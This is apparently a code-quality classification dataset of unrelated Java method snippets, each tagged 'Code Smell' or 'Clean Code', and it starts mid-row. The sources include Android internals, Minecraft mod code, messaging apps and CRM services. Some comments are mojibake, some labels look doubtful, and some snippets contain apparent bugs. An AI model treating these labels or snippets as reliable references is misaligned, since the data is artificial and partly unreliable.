  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
    try {
      return am.broadcastIntentWithFeature(appThread,callingFeatureId,intent,resolvedType,resultTo,resultCode,resultData,null,requiredPermissions,null,null,appOp,null,serialized,sticky,userId);
    }
 catch (    NoSuchMethodError ignored) {
      return am.broadcastIntentWithFeature(appThread,callingFeatureId,intent,resolvedType,resultTo,resultCode,resultData,null,requiredPermissions,null,appOp,null,serialized,sticky,userId);
    }
  }
 else   if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R) {
    return am.broadcastIntentWithFeature(appThread,callingFeatureId,intent,resolvedType,resultTo,resultCode,resultData,map,requiredPermissions,appOp,options,serialized,sticky,userId);
  }
 else {
    return am.broadcastIntent(appThread,intent,resolvedType,resultTo,resultCode,resultData,map,requiredPermissions,appOp,options,serialized,sticky,userId);
  }
}",1,Code Smell
"/** 
 * Core method for set operations. This method operates on two sets, a self set and an iterated set. Note that it ONLY iterates non-null blocks in the iterated set.
 * @param self     the self set
 * @param iterated the other set, whose non-null blocks are iterated
 * @param action   the action to be taken during iteration
 * @param < R >      type of returned value
 * @return result of the action
 */
private static <R>R iterateBlocks(SparseBitSet self,SparseBitSet iterated,BlockAction<R> action){
  assert self == action.self;
  long[][][] selfTable=self.table;
  long[][][] iteratedTable=iterated.table;
  action.start(iterated);
  boolean canIterateBothSets=action.isIterateBothSets();
  outer:   for (int w1=0; w1 < iteratedTable.length; ++w1) {
    long[][] iteratedArea=iteratedTable[w1];
    if (iteratedArea != null) {
      boolean isZeroArea=true;
      for (int w2=0; w2 < LENGTH2; ++w2) {
        long[] iteratedBlock=iteratedArea[w2];
        if (iteratedBlock != null) {
          long[] selfBlock=getBlock(selfTable,w1,w2);
          boolean isZeroBlock=action.accept(w1,w2,selfBlock,iteratedBlock);
          if (isZeroBlock) {
            if (selfBlock != null) {
              selfTable[w1][w2]=null;
              self.invalidateState();
            }
          }
 else {
            isZeroArea=false;
          }
          if (action.canBreak()) {
            break outer;
          }
        }
      }
      if (isZeroArea && canIterateBothSets && w1 < selfTable.length && selfTable[w1] != null) {
        selfTable[w1]=null;
        self.invalidateState();
      }
    }
  }
  action.finish();
  return action.getResult();
}",1,Code Smell
"@Override public final InteractionResult use(BlockState state,Level level,BlockPos pos,Player player,InteractionHand hand,BlockHitResult hit){
  if (level.isClientSide)   return InteractionResult.PASS;
  ItemStack stack=player.getItemInHand(hand);
  if (!player.isShiftKeyDown() && stack.is(AllItems.WRENCH.get()) && !player.getCooldowns().isOnCooldown(stack.getItem())&& AllBogeyStyles.BOGEY_STYLES.size() > 1) {
    BlockEntity be=level.getBlockEntity(pos);
    if (!(be instanceof AbstractBogeyBlockEntity))     return InteractionResult.FAIL;
    player.getCooldowns().addCooldown(stack.getItem(),20);
    BogeyStyle currentStyle=sbbe.getStyle();
    BogeySizes.BogeySize size=getSize();
    BogeyStyle style=this.getNextStyle(currentStyle);
    if (style == currentStyle)     return InteractionResult.PASS;
    Set<BogeySizes.BogeySize> validSizes=style.validSizes();
    for (int i=0; i < BogeySizes.all().size(); i++) {
      if (validSizes.contains(size))       break;
      size=size.nextBySize();
    }
    sbbe.setBogeyStyle(style);
    CompoundTag defaultData=style.defaultData;
    sbbe.setBogeyData(sbbe.getBogeyData().merge(defaultData));
    if (size == getSize()) {
      if (state.getBlock() != style.getBlockForSize(size)) {
        CompoundTag oldData=sbbe.getBogeyData();
        level.setBlock(pos,copyProperties(state,getStateOfSize(sbbe,size)),Block.UPDATE_ALL);
        if (!(level.getBlockEntity(pos) instanceof AbstractBogeyBlockEntity))         return InteractionResult.FAIL;
        bogeyBlockEntity.setBogeyData(oldData);
      }
      player.displayClientMessage(Lang.translateDirect(""bogey.style.updated_style"").append("": "").append(style.displayName),true);
    }
 else {
      CompoundTag oldData=sbbe.getBogeyData();
      level.setBlock(pos,this.getStateOfSize(sbbe,size),Block.UPDATE_ALL);
      if (!(level.getBlockEntity(pos) instanceof AbstractBogeyBlockEntity))       return InteractionResult.FAIL;
      bogeyBlockEntity.setBogeyData(oldData);
      player.displayClientMessage(Lang.translateDirect(""bogey.style.updated_style_and_size"").append("": "").append(style.displayName),true);
    }
    return InteractionResult.CONSUME;
  }
  return onInteractWithBogey(state,level,pos,player,hand,hit);
}",1,Code Smell
"/** 
 * Retrieves the entry from the cache. If the entry is not present, it creates a new entry. This method is not thread safe, it must be called from a synchronized method.
 */
@NonNull protected <T>CacheEntry cacheLocked(@NonNull final ComponentName componentName,@NonNull final UserHandle user,@NonNull final Supplier<T> infoProvider,@NonNull final CachingLogic<T> cachingLogic,final boolean usePackageIcon,final boolean useLowResIcon){
  return cacheLocked(componentName,user,infoProvider,cachingLogic,null,usePackageIcon,useLowResIcon);
}
@NonNull protected <T>CacheEntry cacheLocked(@NonNull final ComponentName componentName,@NonNull final UserHandle user,@NonNull final Supplier<T> infoProvider,@NonNull final CachingLogic<T> cachingLogic,@Nullable final Cursor cursor,final boolean usePackageIcon,final boolean useLowResIcon){
  assertWorkerThread();
  ComponentKey cacheKey=new ComponentKey(componentName,user);
  CacheEntry entry=mCache.get(cacheKey);
  if (entry == null || (entry.bitmap.isLowRes() && !useLowResIcon)) {
    entry=new CacheEntry();
    if (cachingLogic.addToMemCache()) {
      mCache.put(cacheKey,entry);
    }
    T object=null;
    boolean providerFetchedOnce=false;
    boolean cacheEntryUpdated=cursor == null ? getEntryFromDBLocked(cacheKey,entry,useLowResIcon) : updateTitleAndIconLocked(cacheKey,entry,cursor,useLowResIcon);
    if (!cacheEntryUpdated) {
      object=infoProvider.get();
      providerFetchedOnce=true;
      loadFallbackIcon(object,entry,cachingLogic,usePackageIcon,true,componentName,user);
    }
    if (TextUtils.isEmpty(entry.title)) {
      if (object == null && !providerFetchedOnce) {
        object=infoProvider.get();
        providerFetchedOnce=true;
      }
      if (object != null) {
        loadFallbackTitle(object,entry,cachingLogic,user);
      }
    }
  }
  return entry;
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") @Override public boolean equals(Object other){
  if (this == other) {
    return true;
  }
  if (other == null) {
    return false;
  }
  if (getClass() != other.getClass()) {
    return false;
  }
  if (!(other.getClass().getGenericInterfaces()[0].equals(this.getClass().getGenericInterfaces()[0]))) {
    return false;
  }
  Ref<T> otherRef=(Ref<T>)other;
  if (itemsWithWeight == null) {
    if (otherRef.itemsWithWeight != null) {
      return false;
    }
  }
 else {
    if (otherRef.itemsWithWeight == null) {
      return false;
    }
 else {
      return this.itemsWithWeight.equals(otherRef.itemsWithWeight);
    }
  }
  return true;
}
@Override public boolean equals(Object other){
  if (this == other) {
    return true;
  }
  if (other == null) {
    return false;
  }
  if (getClass() != other.getClass()) {
    return false;
  }
  Chooser otherChooser=(Chooser)other;
  if (this.uniqueKey == null) {
    if (otherChooser.getUniqueKey() != null) {
      return false;
    }
  }
 else {
    if (otherChooser.getUniqueKey() == null) {
      return false;
    }
 else     if (!this.uniqueKey.equals(otherChooser.getUniqueKey())) {
      return false;
    }
  }
  if (this.ref == null) {
    if (otherChooser.getRef() != null) {
      return false;
    }
  }
 else {
    if (otherChooser.getRef() == null) {
      return false;
    }
 else     if (!this.ref.equals(otherChooser.getRef())) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"private void moveShardClusterToSuitableThreadPool(List<Long> needMoveShardIdList,Map<Long,List<Long>> shardIdPhysicalClusterIdListMap,List<Long> withoutClusterShardIdList,List<Long> idleShardIdList,List<Long> notBusyShardIdList,boolean clearTaskIfFullAndOnlyOneCluster){
  for (  Long needMoveShardId : needMoveShardIdList) {
    List<Long> physicalClusterIdList=shardIdPhysicalClusterIdListMap.get(needMoveShardId);
    if ((physicalClusterIdList == null || physicalClusterIdList.isEmpty() || physicalClusterIdList.size() == 1) && clearTaskIfFullAndOnlyOneCluster) {
      closeOldAndCreateNew(needMoveShardId);
      continue;
    }
    if (physicalClusterIdList == null) {
      continue;
    }
    for (int idx=0; idx < physicalClusterIdList.size() - 1; ++idx) {
      Long newSuitableShardId=this.selectAndEmptySuitableThreadPool(shardIdPhysicalClusterIdListMap,withoutClusterShardIdList,idleShardIdList,notBusyShardIdList);
      if (newSuitableShardId == null) {
        LOGGER.info(""without suitable job-thread-pool and return."");
        return;
      }
      modifyPhysicalClusterIdAndShardIdCache(physicalClusterIdList.get(idx),newSuitableShardId);
    }
  }
}",1,Code Smell
"/** 
 * Generates a pairing secret. This should be called before each session. The public key of the card is used as input for the EC-DH algorithm. The output is stored as the secret.
 * @param pubkeyData the public key returned by the applet as response to the SELECT command
 */
public void initiateSecureChannel(byte[] pubkeyData){
  try {
    byte[] privkeyData=this.eckey.getPrivKeyBytes();
    secretPoint=new SecretPoint(privkeyData,pubkeyData);
    secret=secretPoint.ECDHSecretAsBytes();
    byte[] msg_key=""sc_key"".getBytes();
    byte[] derived_key_2Ob=getHmacSha1Hash(secret,msg_key);
    derived_key=new byte[16];
    System.arraycopy(derived_key_2Ob,0,derived_key,0,16);
    byte[] msg_mac=""sc_mac"".getBytes();
    mac_key=getHmacSha1Hash(secret,msg_mac);
    ivCounter=1;
    initialized_secure_channel=true;
  }
 catch (  Exception e) {
    log.error(""Error initiating secure channel"",e);
  }
}",0,Clean Code
"/** 
 * Creates a new callback with default priority.
 * @hide
 */
@SuppressWarnings(""deprecation"") public XC_InitPackageResources(){
  super();
}
/** 
 * Creates a new callback with a specific priority.
 * @param priority See {@link XCallback#priority}.
 * @hide
 */
public XC_InitPackageResources(int priority){
  super(priority);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(scene);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(lineup);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueInfo);
  }
  return size;
}",0,Clean Code
"private void toggleStickerSetInternal(Context context,int toggle,BaseFragment baseFragment,boolean showSettings,TLObject stickerSetObject,TLRPC.StickerSet stickerSet,int type,boolean showTooltip){
  TLRPC.TL_inputStickerSetID stickerSetID=new TLRPC.TL_inputStickerSetID();
  stickerSetID.access_hash=stickerSet.access_hash;
  stickerSetID.id=stickerSet.id;
  if (toggle != 0) {
    TLRPC.TL_messages_installStickerSet req=new TLRPC.TL_messages_installStickerSet();
    req.stickerset=stickerSetID;
    req.archived=toggle == 1;
    markSetInstalling(stickerSet.id,true);
    getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      removingStickerSetsUndos.remove(stickerSet.id);
      if (response instanceof TLRPC.TL_messages_stickerSetInstallResultArchive) {
        processStickerSetInstallResultArchive(baseFragment,showSettings,type,(TLRPC.TL_messages_stickerSetInstallResultArchive)response);
      }
      loadStickers(type,false,false,true,p -> {
        markSetInstalling(stickerSet.id,false);
      }
);
      if (error == null && showTooltip && baseFragment != null) {
        Bulletin.make(baseFragment,new StickerSetBulletinLayout(context,stickerSetObject,StickerSetBulletinLayout.TYPE_ADDED,null,baseFragment.getResourceProvider()),Bulletin.DURATION_SHORT).show();
      }
    }
));
  }
 else {
    markSetUninstalling(stickerSet.id,true);
    TLRPC.TL_messages_uninstallStickerSet req=new TLRPC.TL_messages_uninstallStickerSet();
    req.stickerset=stickerSetID;
    getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      removingStickerSetsUndos.remove(stickerSet.id);
      loadStickers(type,false,true,false,p -> {
        markSetUninstalling(stickerSet.id,false);
      }
);
    }
));
  }
}",0,Clean Code
"/** 
 * 鑾峰彇鍗曚釜鏂囦欢
 * @param batchId batchId
 * @return data
 */
@Override public FileEntity queryOneByBatchId(String batchId){
  FileEntity entity=null;
  AdminFile adminFile=lambdaQuery().eq(AdminFile::getBatchId,batchId).last(""limit 1"").one();
  if (adminFile != null) {
    entity=new FileEntity();
    entity.setIsPublic(adminFile.getIsPublic().toString());
    entity.setPath(adminFile.getPath());
    entity.setFileId(adminFile.getFileId().toString());
    entity.setName(adminFile.getName());
    entity.setCreateTime(adminFile.getCreateTime());
    entity.setCreateUserName(UserCacheUtil.getUserName(adminFile.getCreateUserId()));
    entity.setSize(adminFile.getSize());
    entity.setFileType(adminFile.getFileType());
    entity.setBatchId(adminFile.getBatchId());
  }
  return entity;
}",0,Clean Code
"public static List<Map<String,Object>> run(MysqlContent mysqlContent) throws Exception {
  HttpResponse<String> response=Requests.get(""http://prod-dataops-pmdb.sreworks-dataops/datasource/getDatasourceById?id="" + mysqlContent.getDatasourceId(),null,null);
  Requests.checkResponseStatus(response);
  JSONObject connectConfig=JSONObject.parseObject(response.body()).getJSONObject(""data"").getJSONObject(""connectConfig"");
  String host=connectConfig.getString(""host"");
  int port=connectConfig.getIntValue(""port"");
  String db=connectConfig.getString(""db"");
  String username=connectConfig.getString(""username"");
  String password=connectConfig.getString(""password"");
  Connection con=null;
  ResultSet rs=null;
  String driver=""com.mysql.cj.jdbc.Driver"";
  String url=String.format(""jdbc:mysql://%s:%s/%s?useUnicode=true&characterEncoding=utf-8&useSSL=false"",host,port,db);
  Class.forName(driver);
  try {
    con=DriverManager.getConnection(url,username,password);
    Statement statement=con.createStatement();
    rs=statement.executeQuery(mysqlContent.getSql());
    return get(rs);
  }
  finally {
    if (rs != null) {
      rs.close();
    }
    if (con != null) {
      con.close();
    }
  }
}",0,Clean Code
"private void init(Context context,AttributeSet attrs){
  init(context);
  MessageInputStyle style=MessageInputStyle.parse(context,attrs);
  this.messageInput.setMaxLines(style.getInputMaxLines());
  this.messageInput.setHint(style.getInputHint());
  this.messageInput.setText(style.getInputText());
  this.messageInput.setTextSize(TypedValue.COMPLEX_UNIT_PX,style.getInputTextSize());
  this.messageInput.setTextColor(style.getInputTextColor());
  this.messageInput.setHintTextColor(style.getInputHintColor());
  ViewCompat.setBackground(this.messageInput,style.getInputBackground());
  setCursor(style.getInputCursorDrawable());
  this.attachmentButton.setVisibility(style.showAttachmentButton() ? VISIBLE : GONE);
  this.attachmentButton.setImageDrawable(style.getAttachmentButtonIcon());
  this.attachmentButton.getLayoutParams().width=style.getAttachmentButtonWidth();
  this.attachmentButton.getLayoutParams().height=style.getAttachmentButtonHeight();
  ViewCompat.setBackground(this.attachmentButton,style.getAttachmentButtonBackground());
  this.attachmentButtonSpace.setVisibility(style.showAttachmentButton() ? VISIBLE : GONE);
  this.attachmentButtonSpace.getLayoutParams().width=style.getAttachmentButtonMargin();
  this.messageSendButton.setImageDrawable(style.getInputButtonIcon());
  this.messageSendButton.getLayoutParams().width=style.getInputButtonWidth();
  this.messageSendButton.getLayoutParams().height=style.getInputButtonHeight();
  ViewCompat.setBackground(messageSendButton,style.getInputButtonBackground());
  this.sendButtonSpace.getLayoutParams().width=style.getInputButtonMargin();
  if (getPaddingLeft() == 0 && getPaddingRight() == 0 && getPaddingTop() == 0 && getPaddingBottom() == 0) {
    setPadding(style.getInputDefaultPaddingLeft(),style.getInputDefaultPaddingTop(),style.getInputDefaultPaddingRight(),style.getInputDefaultPaddingBottom());
  }
  this.delayTypingStatusMillis=style.getDelayTypingStatus();
}
private void init(Context context){
  inflate(context,R.layout.view_message_input,this);
  messageInput=findViewById(R.id.messageInput);
  messageSendButton=findViewById(R.id.messageSendButton);
  attachmentButton=findViewById(R.id.attachmentButton);
  sendButtonSpace=findViewById(R.id.sendButtonSpace);
  attachmentButtonSpace=findViewById(R.id.attachmentButtonSpace);
  messageSendButton.setOnClickListener(this);
  attachmentButton.setOnClickListener(this);
  messageInput.addTextChangedListener(this);
  messageInput.setText("""");
  messageInput.setOnFocusChangeListener(this);
}",0,Clean Code
"@Nullable @Override public Authentication convert(HttpServletRequest request){
  String header=request.getHeader(HttpHeaders.AUTHORIZATION);
  if (header == null) {
    return null;
  }
  String[] parts=header.split(""\\s"");
  if (!parts[0].equalsIgnoreCase(""Basic"")) {
    return null;
  }
  if (parts.length != 2) {
    throw new OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_REQUEST);
  }
  byte[] decodedCredentials;
  try {
    decodedCredentials=Base64.getDecoder().decode(parts[1].getBytes(StandardCharsets.UTF_8));
  }
 catch (  IllegalArgumentException ex) {
    throw new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodes.INVALID_REQUEST),ex);
  }
  String credentialsString=new String(decodedCredentials,StandardCharsets.UTF_8);
  String[] credentials=credentialsString.split("":"",2);
  if (credentials.length != 2 || !StringUtils.hasText(credentials[0]) || !StringUtils.hasText(credentials[1])) {
    throw new OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_REQUEST);
  }
  String clientID;
  String clientSecret;
  try {
    clientID=URLDecoder.decode(credentials[0],StandardCharsets.UTF_8.name());
    clientSecret=URLDecoder.decode(credentials[1],StandardCharsets.UTF_8.name());
  }
 catch (  Exception ex) {
    throw new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodes.INVALID_REQUEST),ex);
  }
  return new OAuth2ClientAuthenticationToken(clientID,ClientAuthenticationMethod.CLIENT_SECRET_BASIC,clientSecret,OAuth2EndpointUtils.getParametersIfMatchesAuthorizationCodeGrantRequest(request));
}",0,Clean Code
"public static String getMetaName(String tableName){
  if (StringUtils.isBlank(tableName)) {
    return tableName;
  }
  if (tableName.startsWith(""`"") && tableName.endsWith(""`"")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  if (tableName.startsWith(""\"""") && tableName.endsWith(""\"""")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  if (tableName.startsWith(""'"") && tableName.endsWith(""'"")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  if (tableName.startsWith(""["") && tableName.endsWith(""]"")) {
    return tableName.substring(1,tableName.length() - 1);
  }
  return tableName;
}",0,Clean Code
"@NonNull public static String formatGid(int gid){
  int appid=gid % AID_USER_OFFSET;
  int userid=gid / AID_USER_OFFSET;
  if (appid >= AID_ISOLATED_START) {
    return String.format(Locale.ROOT,""u%d_i%d"",userid,appid - AID_ISOLATED_START);
  }
 else   if (userid == 0 && appid >= AID_SHARED_GID_START && appid <= AID_SHARED_GID_END) {
    return String.format(Locale.ROOT,""all_a%d"",appid - AID_SHARED_GID_START);
  }
 else   if (appid >= AID_EXT_CACHE_GID_START && appid <= AID_EXT_CACHE_GID_END) {
    return String.format(Locale.ROOT,""u%d_a%d_ext_cache"",userid,appid - AID_EXT_CACHE_GID_START);
  }
 else   if (appid >= AID_EXT_GID_START && appid <= AID_EXT_GID_END) {
    return String.format(Locale.ROOT,""u%d_a%d_ext"",userid,appid - AID_EXT_GID_START);
  }
 else   if (appid >= AID_CACHE_GID_START && appid <= AID_CACHE_GID_END) {
    return String.format(Locale.ROOT,""u%d_a%d_cache"",userid,appid - AID_CACHE_GID_START);
  }
 else   if (appid < AID_APP_START) {
    return String.valueOf(gid);
  }
 else {
    return String.format(Locale.ROOT,""u%d_a%d"",userid,appid - AID_APP_START);
  }
}",0,Clean Code
"private void signIn(){
  if (mSigningIn) {
    return;
  }
  Context context=getEHContext();
  MainActivity activity=getActivity2();
  if (null == context || null == activity || null == mUsername || null == mPassword || null == mUsernameLayout || null == mPasswordLayout) {
    return;
  }
  String username=mUsername.getText().toString();
  String password=mPassword.getText().toString();
  if (username.isEmpty()) {
    mUsernameLayout.setError(getString(R.string.error_username_cannot_empty));
    return;
  }
 else {
    mUsernameLayout.setError(null);
  }
  if (password.isEmpty()) {
    mPasswordLayout.setError(getString(R.string.error_password_cannot_empty));
    return;
  }
 else {
    mPasswordLayout.setError(null);
  }
  hideSoftInput();
  showProgress(true);
  EhUtils.signOut(context);
  EhCallback callback=new SignInListener(context,activity.getStageId(),getTag());
  mRequestId=((EhApplication)context.getApplicationContext()).putGlobalStuff(callback);
  EhRequest request=new EhRequest().setMethod(EhClient.METHOD_SIGN_IN).setArgs(username,password).setCallback(callback);
  EhApplication.getEhClient(context).execute(request);
  mSigningIn=true;
}",0,Clean Code
"@Override public List<HrmEmployeeField> downloadExcelFiled(){
  List<HrmEmployeeField> list=employeeFieldService.lambdaQuery().eq(HrmEmployeeField::getIsImportField,1).eq(HrmEmployeeField::getIsHidden,0).list();
  for (  HrmEmployeeField hrmEmployeeField : list) {
    if (""channel_id"".equals(hrmEmployeeField.getFieldName())) {
      List<HrmRecruitChannel> channelList=recruitChannelService.lambdaQuery().eq(HrmRecruitChannel::getStatus,1).list();
      List<Map<String,Object>> mapList=new ArrayList<>();
      for (      HrmRecruitChannel channel : channelList) {
        Map<String,Object> map=new HashMap<>();
        map.put(""name"",channel.getValue());
        mapList.add(map);
      }
      hrmEmployeeField.setOptions(JSON.toJSONString(mapList));
    }
  }
  return list.stream().sorted(Comparator.comparingInt(HrmEmployeeField::getSorting)).sorted(Comparator.comparingInt(HrmEmployeeField::getLabel)).collect(Collectors.toList());
}",0,Clean Code
"/** 
 * 鏇存柊 K8s Microservice (鏅)
 */
@Override public K8sMicroServiceMetaDTO update(K8sMicroServiceMetaUpdateReq request){
  K8sMicroserviceMetaQueryCondition condition=K8sMicroserviceMetaQueryCondition.builder().appId(request.getAppId()).microServiceId(request.getMicroServiceId()).arch(request.getArch()).namespaceId(request.getNamespaceId()).stageId(request.getStageId()).withBlobs(true).build();
  K8sMicroServiceMetaDO dbMeta=k8SMicroserviceMetaService.get(condition);
  if (dbMeta == null) {
    throw new AppException(AppErrorCode.INVALID_USER_ARGS,String.format(""cannot find k8s microservice meta|condition=%s"",JSONObject.toJSONString(condition)));
  }
  K8sMicroServiceMetaDTO dto=new K8sMicroServiceMetaDTO();
  ClassUtil.copy(request,dto);
  if (dto.getImagePushObject() == null) {
    log.warn(""invalid image push object from request|request={}|dto={}"",JSONObject.toJSONString(request),JSONObject.toJSONString(dto));
    dto.setImagePushObject(k8sMicroServiceMetaDtoConvert.to(dbMeta).getImagePushObject());
  }
  return update(dto);
}
/** 
 * 鏇存柊 K8s Microservice (蹇)
 */
@Override public K8sMicroServiceMetaDTO update(K8sMicroServiceMetaQuickUpdateReq request){
  K8sMicroServiceMetaDTO dto=new K8sMicroServiceMetaDTO();
  ClassUtil.copy(request,dto);
  return update(dto);
}
/** 
 * 鏇存柊 K8S Microservice
 * @param dto K8S Microservice DTO 瀵硅薄
 * @return K8s Microservice DTO 瀵硅薄
 */
@Override @Transactional(rollbackFor=Exception.class) public K8sMicroServiceMetaDTO update(K8sMicroServiceMetaDTO dto){
  K8sMicroServiceMetaDO meta=k8sMicroServiceMetaDtoConvert.from(dto);
  K8sMicroserviceMetaQueryCondition condition=K8sMicroserviceMetaQueryCondition.builder().appId(dto.getAppId()).namespaceId(dto.getNamespaceId()).stageId(dto.getStageId()).microServiceId(dto.getMicroServiceId()).arch(dto.getArch()).withBlobs(true).build();
  k8SMicroserviceMetaService.update(meta,condition);
  if (!deployConfigService.hasEnvBinding(DeployConfigHasEnvBindingReq.builder().apiVersion(DefaultConstant.API_VERSION_V1_ALPHA2).appId(dto.getAppId()).isolateNamespaceId(dto.getNamespaceId()).isolateStageId(dto.getStageId()).build())) {
    if (EnvUtil.isSreworks()) {
      refreshDeployConfigForSreworks(dto);
    }
 else {
      refreshDeployConfig(dto);
    }
  }
  return k8sMicroServiceMetaDtoConvert.to(k8SMicroserviceMetaService.get(condition));
}",0,Clean Code
"protected Criterion(String condition){
  super();
  this.condition=condition;
  this.typeHandler=null;
  this.noValue=true;
}
protected Criterion(String condition,Object value,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.typeHandler=typeHandler;
  if (value instanceof List<?>) {
    this.listValue=true;
  }
 else {
    this.singleValue=true;
  }
}
protected Criterion(String condition,Object value){
  this(condition,value,null);
}
protected Criterion(String condition,Object value,Object secondValue,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.secondValue=secondValue;
  this.typeHandler=typeHandler;
  this.betweenValue=true;
}
protected Criterion(String condition,Object value,Object secondValue){
  this(condition,value,secondValue,null);
}
protected Criterion(String condition){
  super();
  this.condition=condition;
  this.typeHandler=null;
  this.noValue=true;
}
protected Criterion(String condition,Object value,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.typeHandler=typeHandler;
  if (value instanceof List<?>) {
    this.listValue=true;
  }
 else {
    this.singleValue=true;
  }
}
protected Criterion(String condition,Object value){
  this(condition,value,null);
}
protected Criterion(String condition,Object value,Object secondValue,String typeHandler){
  super();
  this.condition=condition;
  this.value=value;
  this.secondValue=secondValue;
  this.typeHandler=typeHandler;
  this.betweenValue=true;
}
protected Criterion(String condition,Object value,Object secondValue){
  this(condition,value,secondValue,null);
}
",0,Clean Code
"/** 
 * 鏇存柊搴楅摵
 * @param result
 */
@Override protected void processUpdateInternal(CanalBinLogResult<ShopDetailBO> result){
  ShopDetailBO beforeData=result.getBeforeData();
  if (Objects.isNull(beforeData.getShopName()) && StrUtil.isBlank(beforeData.getShopLogo()) && !Objects.equals(beforeData.getShopStatus(),StatusEnum.ENABLE.value())) {
    return;
  }
  ShopDetailBO afterData=result.getAfterData();
  EsProductBO esProductBO=new EsProductBO();
  if (StrUtil.isNotBlank(beforeData.getShopName())) {
    esProductBO.setShopName(afterData.getShopName());
  }
  if (Objects.nonNull(beforeData.getShopLogo())) {
    esProductBO.setShopImg(afterData.getShopLogo());
  }
  if (Objects.nonNull(beforeData.getShopStatus()) && Objects.equals(beforeData.getShopId(),StatusEnum.ENABLE.value())) {
    esProductBO.setSpuStatus(StatusEnum.DISABLE.value());
  }
  ServerResponseEntity<List<Long>> responseData=productFeignClient.getSpuIdsByShopId(afterData.getShopId());
  productUpdateManager.esUpdateSpuBySpuIds(responseData.getData(),esProductBO);
}
",0,Clean Code
"public void removePendingStream(Video video){
  if (video == null || video.videoId == null || !containsPendingStream(video)) {
    return;
  }
  Helpers.removeIf(mPendingStreams,item -> video.videoId.equals(item.videoId));
  persistState();
}
",0,Clean Code
"@Override public Map<String,Object> getConditionMap(Integer label,Integer typeId,Integer recordId){
  ExamineRecord record=examineRecordService.getById(recordId);
  if (record == null) {
    log.error(""娌℃湁鎵惧埌瀵瑰簲鐨勫鏍歌褰曪紒鏌ユ壘鐨勮褰昳d涓簕}"",recordId);
    return new HashMap<>(2);
  }
  ExamineConditionDataBO examineConditionDataBO=new ExamineConditionDataBO();
  examineConditionDataBO.setLabel(label);
  examineConditionDataBO.setTypeId(typeId);
  Long examineId=record.getExamineId();
  examineConditionDataBO.setCategoryId(examineId.intValue());
  List<String> fieldList=new ArrayList<>();
  List<ExamineFlowConditionDataVO> conditionDataVoS=examineService.previewFiledName(label,recordId,null);
  if (conditionDataVoS != null) {
    fieldList=conditionDataVoS.stream().map(ExamineFlowConditionDataVO::getFieldName).collect(Collectors.toList());
    fieldList.removeIf(StrUtil::isEmpty);
  }
  examineConditionDataBO.setFieldList(fieldList);
  return oaService.getDataMapForNewExamine(examineConditionDataBO).getData();
}",0,Clean Code
"@EventHandler private void onEntityAdded(EntityAddedEvent event){
  if (!(event.entity instanceof EndCrystalEntity))   return;
  if (placing && event.entity.getBlockPos().equals(placingCrystalBlockPos)) {
    placing=false;
    placingTimer=0;
    placedCrystals.add(event.entity.getId());
  }
  if (fastBreak.get() && !didRotateThisTick && attacks < attackFrequency.get()) {
    float damage=getBreakDamage(event.entity,true);
    if (damage > minDamage.get())     doBreak(event.entity);
  }
}",0,Clean Code
"@PostConstruct public void init() throws IOException {
  String path=""/app/client-deploy-packages"";
  File file=new File(path);
  File[] fs=file.listFiles();
  for (  File pkg : fs) {
    if (!pkg.isDirectory()) {
      continue;
    }
    File clientFile=new File(pkg.getAbsolutePath() + ""/client.yaml"");
    if (!clientFile.exists()) {
      continue;
    }
    Yaml yaml=SchemaUtil.createYaml();
    String content=FileUtils.readFileToString(clientFile,StandardCharsets.UTF_8);
    JSONObject clientInfo=yaml.loadAs(content,JSONObject.class);
    packages.put(pkg.getName(),clientInfo);
  }
}",0,Clean Code
"/** 
 * 鍒犻櫎鏁版嵁
 * @param ids ids
 */
@Override @Transactional(rollbackFor=Exception.class) public void deleteByIds(List<Integer> ids){
  LambdaQueryWrapper<CrmProduct> wrapper=new LambdaQueryWrapper<>();
  wrapper.select(CrmProduct::getBatchId);
  wrapper.in(CrmProduct::getProductId,ids);
  List<String> batchIdList=listObjs(wrapper,Object::toString);
  crmActionRecordService.deleteActionRecord(CrmEnum.PRODUCT,ids);
  if (CollUtil.isNotEmpty(batchIdList)) {
  }
  LambdaUpdateWrapper<CrmProduct> updateWrapper=new LambdaUpdateWrapper<>();
  updateWrapper.set(CrmProduct::getStatus,3);
  updateWrapper.in(CrmProduct::getProductId,ids);
  update(updateWrapper);
  deletePage(ids);
}",0,Clean Code
"/** 
 * Unescapes  {@code data} up to the specified limit, replacing occurrences of [0, 0, 3] with[0, 0]. The unescaped data is returned in-place, with the return value indicating its length. <p> Executions of this method are mutually exclusive, so it should not be called with very large buffers.
 * @param data The data to unescape.
 * @param limit The limit (exclusive) of the data to unescape.
 * @return The length of the unescaped data.
 */
public static int unescapeStream(byte[] data,int limit){
synchronized (scratchEscapePositionsLock) {
    int position=0;
    int scratchEscapeCount=0;
    while (position < limit) {
      position=findNextUnescapeIndex(data,position,limit);
      if (position < limit) {
        if (scratchEscapePositions.length <= scratchEscapeCount) {
          scratchEscapePositions=Arrays.copyOf(scratchEscapePositions,scratchEscapePositions.length * 2);
        }
        scratchEscapePositions[scratchEscapeCount++]=position;
        position+=3;
      }
    }
    int unescapedLength=limit - scratchEscapeCount;
    int escapedPosition=0;
    int unescapedPosition=0;
    for (int i=0; i < scratchEscapeCount; i++) {
